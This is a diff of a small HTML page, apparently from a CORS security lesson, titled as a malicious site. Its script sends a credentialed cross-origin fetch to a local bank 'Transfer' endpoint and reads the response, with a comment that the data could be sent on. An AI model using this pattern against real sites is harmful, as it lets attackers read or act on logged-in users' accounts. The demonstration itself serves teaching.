@@ -3,14 +3,16 @@
 <head>
     <title>Malicious or infected web site</title>
 </head>
-    <body style="text-align:center;">
+<body style="text-align:center;">
 
-        
+    This could be a partner website or another applciation belonging to our organization for which we have made special CORS ((Cross-Origin Resource Sharing) settings.
 
-        <script>
-            fetch('https://localhost:7093/BankAccount/Transfer', {credentials:"include"})
+    
+
+    <script>
+        fetch('https://localhost:7093/BankAccount/Transfer', { credentials: "include" })
             .then((response) => response.text())
-            .then(html => console.log(html))
-        </script>
-    </body>
+            .then(html => console.log(html)) // here we could send the data
+    </script>
+</body>
 </html>
